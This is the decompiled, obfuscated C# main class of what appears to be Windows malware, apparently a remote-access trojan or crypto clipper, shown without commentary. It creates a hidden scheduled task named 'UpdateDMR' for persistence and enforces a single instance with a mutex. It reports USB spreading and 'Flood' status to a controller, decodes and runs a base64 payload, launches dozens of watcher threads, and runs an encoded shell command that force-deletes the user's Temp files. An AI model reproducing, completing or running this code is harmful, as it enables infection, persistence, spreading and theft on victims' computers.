using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using Client;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns0;
using ns1;
using ns10;
using ns11;
using ns12;
using ns14;
using ns15;
using ns16;
using ns18;
using ns19;
using ns2;
using ns20;
using ns21;
using ns22;
using ns23;
using ns24;
using ns25;
using ns27;
using ns28;
using ns29;
using ns3;
using ns30;
using ns31;
using ns32;
using ns33;
using ns34;
using ns35;
using ns36;
using ns37;
using ns38;
using ns39;
using ns4;
using ns40;
using ns41;
using ns42;
using ns43;
using ns44;
using ns45;
using ns46;
using ns5;
using ns6;
using ns7;
using ns8;
using ns9;

namespace ns17;

public class GClass16
{
	public static object object_0 = GClass20.string_4;

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		//IL_07c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_07cc: Expected O, but got Unknown
		try
		{
			string text = "";
			Random random = new Random();
			int num = 10;
			do
			{
				text += Conversions.ToString(Strings.ChrW(64 + random.Next(1, 26)));
				num++;
			}
			while (num <= 60);
			for (int num2 = GClass20.int_1; num2 != 0; num2--)
			{
				Thread.Sleep(1000);
			}
			smethod_3();
			bool createdNew = false;
			GClass20.mutex_0 = new Mutex(initiallyOwned: true, GClass14.smethod_5(), out createdNew);
			if (!createdNew)
			{
				ProjectData.EndApp();
			}
			if (GClass20.bool_15)
			{
				if (GClass20.bool_7)
				{
					GClass3.smethod_0();
				}
				if (GClass20.bool_8)
				{
					GClass4.smethod_0();
				}
				if (GClass20.bool_9)
				{
					GClass5.smethod_0();
				}
				if (GClass20.bool_10)
				{
					GClass6.smethod_0();
				}
				if (GClass20.bool_11)
				{
					GClass2.smethod_1();
				}
				if (GClass20.bool_12)
				{
					GClass7.smethod_0();
				}
				if (GClass20.bool_14)
				{
					GClass0.smethod_0();
				}
				if (GClass20.bool_2)
				{
					GClass19.smethod_0();
				}
				if (GClass20.bool_3)
				{
					GClass19.smethod_1();
				}
				if (GClass20.bool_4)
				{
					GClass19.smethod_2();
				}
				if (GClass20.bool_5)
				{
					GClass19.smethod_3();
				}
				if (GClass20.bool_13)
				{
					GClass1.smethod_0();
				}
			}
			GClass15.smethod_0();
			GClass21.thread_0.Start();
			if (GClass20.bool_0)
			{
				Thread thread = new Thread(smethod_1);
				thread.Start();
			}
			Thread thread2 = new Thread(smethod_0);
			thread2.Start();
			Thread thread3 = new Thread(smethod_0);
			thread3.Start();
			Thread thread4 = new Thread(smethod_0);
			thread4.Start();
			if (GClass20.bool_18)
			{
				GClass9.smethod_0();
			}
			if (GClass20.bool_1)
			{
				C_DRPB.smethod_0();
			}
			if (GClass20.bool_6)
			{
				PR.domen.Start();
				PR.smethod_0();
			}
			Thread thread5 = new Thread(GClass12.smethod_0);
			thread5.Start();
			Thread thread6 = new Thread(GClass22.smethod_0);
			thread6.Start();
			Thread thread7 = new Thread(GClass8.smethod_0);
			thread7.Start();
			if (Operators.CompareString(GClass20.string_51, string.Empty, false) != 0)
			{
				Thread thread8 = new Thread(GClass18.smethod_0);
				thread8.Start();
			}
			if (Operators.CompareString(GClass20.string_52, string.Empty, false) != 0)
			{
				Thread thread9 = new Thread(GClass18.smethod_1);
				thread9.Start();
			}
			if (GClass20.string_14.Length > 25)
			{
				Thread thread10 = new Thread(GClass32.smethod_0);
				thread10.SetApartmentState(ApartmentState.STA);
				thread10.Start();
			}
			if (GClass20.string_15.Length > 25)
			{
				Thread thread11 = new Thread(GClass40.smethod_0);
				thread11.SetApartmentState(ApartmentState.STA);
				thread11.Start();
			}
			if (GClass20.string_16.Length > 92)
			{
				Thread thread12 = new Thread(GClass41.smethod_0);
				thread12.SetApartmentState(ApartmentState.STA);
				thread12.Start();
			}
			if (GClass20.string_17.Length > 39)
			{
				Thread thread13 = new Thread(GClass38.smethod_0);
				thread13.SetApartmentState(ApartmentState.STA);
				thread13.Start();
			}
			if (GClass20.string_18.Length > 32)
			{
				Thread thread14 = new Thread(GClass45.smethod_0);
				thread14.SetApartmentState(ApartmentState.STA);
				thread14.Start();
			}
			if (GClass20.string_19.Length > 89)
			{
				Thread thread15 = new Thread(GClass29.smethod_0);
				thread15.SetApartmentState(ApartmentState.STA);
				thread15.Start();
			}
			if (GClass20.string_20.Length > 29)
			{
				Thread thread16 = new Thread(GClass35.smethod_0);
				thread16.SetApartmentState(ApartmentState.STA);
				thread16.Start();
			}
			if (GClass20.string_21.Length > 39)
			{
				Thread thread17 = new Thread(GClass31.smethod_0);
				thread17.SetApartmentState(ApartmentState.STA);
				thread17.Start();
			}
			if (GClass20.string_22.Length > 33)
			{
				Thread thread18 = new Thread(GClass37.smethod_0);
				thread18.SetApartmentState(ApartmentState.STA);
				thread18.Start();
			}
			if (GClass20.string_23.Length > 33)
			{
				Thread thread19 = new Thread(GClass42.smethod_0);
				thread19.SetApartmentState(ApartmentState.STA);
				thread19.Start();
			}
			if (GClass20.string_24.Length > 32)
			{
				Thread thread20 = new Thread(GClass33.smethod_0);
				thread20.SetApartmentState(ApartmentState.STA);
				thread20.Start();
			}
			if (GClass20.string_25.Length > 25)
			{
				Thread thread21 = new Thread(GClass36.smethod_0);
				thread21.SetApartmentState(ApartmentState.STA);
				thread21.Start();
			}
			if (GClass20.string_26.Length > 54)
			{
				Thread thread22 = new Thread(GClass27.smethod_0);
				thread22.SetApartmentState(ApartmentState.STA);
				thread22.Start();
			}
			if (GClass20.string_27.Length > 33)
			{
				Thread thread23 = new Thread(GClass26.smethod_0);
				thread23.SetApartmentState(ApartmentState.STA);
				thread23.Start();
			}
			if (GClass20.string_28.Length > 92)
			{
				Thread thread24 = new Thread(GClass24.smethod_0);
				thread24.SetApartmentState(ApartmentState.STA);
				thread24.Start();
			}
			if (GClass20.string_30.Length > 32)
			{
				Thread thread25 = new Thread(GClass23.smethod_0);
				thread25.SetApartmentState(ApartmentState.STA);
				thread25.Start();
			}
			if (GClass20.string_12.Length > 10)
			{
				Thread thread26 = new Thread(GClass44.smethod_0);
				thread26.SetApartmentState(ApartmentState.STA);
				thread26.Start();
			}
			if (GClass20.string_11.Length > 11)
			{
				Thread thread27 = new Thread(GClass43.smethod_0);
				thread27.SetApartmentState(ApartmentState.STA);
				thread27.Start();
			}
			if (GClass20.string_13.Length > 14)
			{
				Thread thread28 = new Thread(GClass30.smethod_0);
				thread28.SetApartmentState(ApartmentState.STA);
				thread28.Start();
			}
			if (GClass20.string_31.Length > 15)
			{
				Thread thread29 = new Thread(GClass34.smethod_0);
				thread29.SetApartmentState(ApartmentState.STA);
				thread29.Start();
			}
			if (GClass20.string_33.Length > 12)
			{
				Thread thread30 = new Thread(GClass28.smethod_0);
				thread30.SetApartmentState(ApartmentState.STA);
				thread30.Start();
			}
			if (GClass20.string_34.Length > 12)
			{
				Thread thread31 = new Thread(GClass28.smethod_1);
				thread31.SetApartmentState(ApartmentState.STA);
				thread31.Start();
			}
			if (GClass20.string_35.Length > 12)
			{
				Thread thread32 = new Thread(GClass28.smethod_2);
				thread32.SetApartmentState(ApartmentState.STA);
				thread32.Start();
			}
			if (GClass20.string_36.Length > 12)
			{
				Thread thread33 = new Thread(GClass28.smethod_3);
				thread33.SetApartmentState(ApartmentState.STA);
				thread33.Start();
			}
			if (GClass20.string_37.Length > 12)
			{
				Thread thread34 = new Thread(GClass28.smethod_4);
				thread34.SetApartmentState(ApartmentState.STA);
				thread34.Start();
			}
			if (GClass20.string_38.Length > 12)
			{
				Thread thread35 = new Thread(GClass28.smethod_5);
				thread35.SetApartmentState(ApartmentState.STA);
				thread35.Start();
			}
			if (GClass20.string_32.Length > 31)
			{
				Thread thread36 = new Thread(GClass39.smethod_0);
				thread36.SetApartmentState(ApartmentState.STA);
				thread36.Start();
			}
			GClass10.smethod_0();
			SystemEvents.add_SessionEnding(new SessionEndingEventHandler(Class0.smethod_13));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("coredll.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void SystemIdleTimerReset();

	private static void smethod_0()
	{
		Thread.Sleep(5000);
		string text = Conversions.ToString(GClass14.smethod_8());
		string text2 = "...";
		string text3 = Conversions.ToString(GClass14.smethod_12());
		GClass17.smethod_0();
		while (true)
		{
			int num = 1;
			if (!GClass21.bool_0)
			{
				Thread.Sleep(5000);
				continue;
			}
			Thread.Sleep(3000);
			try
			{
				if (GClass20.bool_0 && Operators.CompareString(text, Class0.smethod_6("USB").ToString(), false) != 0)
				{
					text = Class0.smethod_6("USB");
					GClass21.smethod_3(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"!SP", object_0), (object)text)));
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex, num);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Operators.CompareString(text2, GClass14.smethod_11(), false) != 0)
				{
					text2 = GClass14.smethod_11();
					GClass21.smethod_3(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"!X", object_0), (object)text2)));
				}
			}
			catch (Exception ex2)
			{
				ProjectData.SetProjectError(ex2, num);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Operators.CompareString(text3, Class0.smethod_6("Flood").ToString(), false) != 0)
				{
					text3 = Class0.smethod_6("Flood");
					GClass21.smethod_3(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"MSG", object_0), (object)"Flood! "), (object)text3)));
					text3 = "";
					Class0.smethod_9("Flood", "");
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3, num);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void smethod_1()
	{
		try
		{
			if (Operators.CompareString(Class0.smethod_6("_USB"), (string)null, false) == 0)
			{
				while (!GClass21.bool_0)
				{
					Thread.Sleep(5000);
				}
				Thread.Sleep(9000);
				GClass21.smethod_3("PLUSB");
			}
			else
			{
				byte[] byte_ = Convert.FromBase64String(Class0.smethod_6("_USB"));
				bool bool_ = false;
				GClass11.smethod_1(Class0.smethod_14(byte_, ref bool_));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			GClass21.smethod_3(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"MSG", object_0), (object)"_USB Error! "), (object)ex2.Message)));
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_2()
	{
		try
		{
			Thread.Sleep(500);
			Interaction.Shell(Class0.smethod_4(Convert.FromBase64String("Y21kIC9jIGNhbGwgREVMIC9GIC9TIC9RIEM6XFVzZXJzXCVVc2VybmFtZSVcQXBwRGF0YVxMb2NhbFxUZW1wXCouKg==")), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static object smethod_3()
	{
		object result = default(object);
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("schtasks /create /f /sc MINUTE /mo " + Conversions.ToString(GClass20.int_2) + " /RL LIMITED /tn UpdateDMR /tr \"'"), GClass20.object_0), (object)"'\"")), (AppWinStyle)0, false, -1);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
